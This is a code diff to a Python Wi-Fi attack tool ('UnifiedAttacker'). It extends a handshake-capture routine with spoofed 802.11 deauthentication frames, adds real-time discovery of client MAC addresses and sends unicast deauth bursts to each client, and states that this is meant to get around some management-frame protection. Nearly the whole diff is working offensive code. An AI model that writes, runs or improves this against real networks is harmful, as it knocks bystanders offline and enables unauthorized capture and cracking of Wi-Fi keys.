@@ -696,6 +696,7 @@ class UnifiedAttacker:
 
         # Run capture in a thread so we can send deauth while it runs
         cap_exc: list = []
+        discovered_clients: set = set()  # populated in real-time by _handler
 
         def _do_cap() -> None:
             try:
@@ -705,12 +706,19 @@ class UnifiedAttacker:
                     bssid_filter=self.target.bssid,
                     timeout=self.CAPTURE_SECS,
                     log_cb=self._log,
+                    client_macs_out=discovered_clients,
                 )
             except Exception as exc:
                 cap_exc.append(exc)
 
         cap_thread = threading.Thread(target=_do_cap, daemon=True)
         cap_thread.start()
+
+        self._log(
+            f"Tip: toggle Wi-Fi off/on on any device connected to '{self.target.ssid}' "
+            "to trigger a handshake without deauth.",
+            "info",
+        )
 
         # Resolve the Npcap interface object once for all deauth rounds.
         # sendp() on Windows requires a NetworkInterface object, not the raw
@@ -730,30 +738,52 @@ class UnifiedAttacker:
             pass
 
         def _send_deauth() -> None:
-            """Send a broadcast deauth burst (spoofed as the AP)."""
+            """Send broadcast + unicast deauth bursts (spoofed as the AP).
+
+            Broadcast deauth is silently dropped by clients with 802.11w MFP
+            active.  Unicast deauth to specific client MACs bypasses some
+            PMF-capable (non-required) implementations.
+            """
             try:
-                dot11 = sc.Dot11(
+                dot11_bc = sc.Dot11(
                     type=0, subtype=12,
                     addr1="ff:ff:ff:ff:ff:ff",
                     addr2=self.target.bssid,
                     addr3=self.target.bssid,
                 )
-                frame = sc.RadioTap() / dot11 / sc.Dot11Deauth(reason=7)
-                sc.sendp(frame, iface=iface_for_send, count=64, inter=0.05, verbose=False)
-                self._log("Deauth burst sent (64 frames)", "info")
+                frame_bc = sc.RadioTap() / dot11_bc / sc.Dot11Deauth(reason=7)
+                sc.sendp(frame_bc, iface=iface_for_send, count=32, inter=0.05, verbose=False)
+
+                clients_snapshot = list(discovered_clients)
+                for client_mac in clients_snapshot:
+                    dot11_uc = sc.Dot11(
+                        type=0, subtype=12,
+                        addr1=client_mac,
+                        addr2=self.target.bssid,
+                        addr3=self.target.bssid,
+                    )
+                    frame_uc = sc.RadioTap() / dot11_uc / sc.Dot11Deauth(reason=7)
+                    sc.sendp(frame_uc, iface=iface_for_send, count=16, inter=0.05, verbose=False)
+
+                client_info = f" + unicast to {len(clients_snapshot)} client(s)" if clients_snapshot else ""
+                self._log(f"Deauth burst sent (broadcast{client_info})", "info")
             except Exception as exc:
                 self._log(f"Deauth failed (non-fatal): {exc}", "warn")
 
         # Send deauth at 5 s, 20 s, 35 s, 50 s into the 60 s capture window.
-        # Multiple rounds are needed because:
-        #  - some clients reconnect quickly and the EAPOL happens between rounds
-        #  - 802.11w (MFP) clients ignore broadcast deauth; a retry may catch
-        #    a non-MFP client that joined later
         _deauth_delays = [5, 15, 15, 15]   # seconds between rounds (total ≤ 50s)
+        first_burst = True
         for delay in _deauth_delays:
             time.sleep(delay)
             if self._stop.is_set() or not cap_thread.is_alive():
                 break
+            if first_burst and discovered_clients:
+                self._log(
+                    f"Clients seen: {', '.join(sorted(discovered_clients))} "
+                    f"— sending unicast deauth",
+                    "info",
+                )
+            first_burst = False
             self._log("Sending deauth burst to force client reconnection...", "info")
             _send_deauth()
 
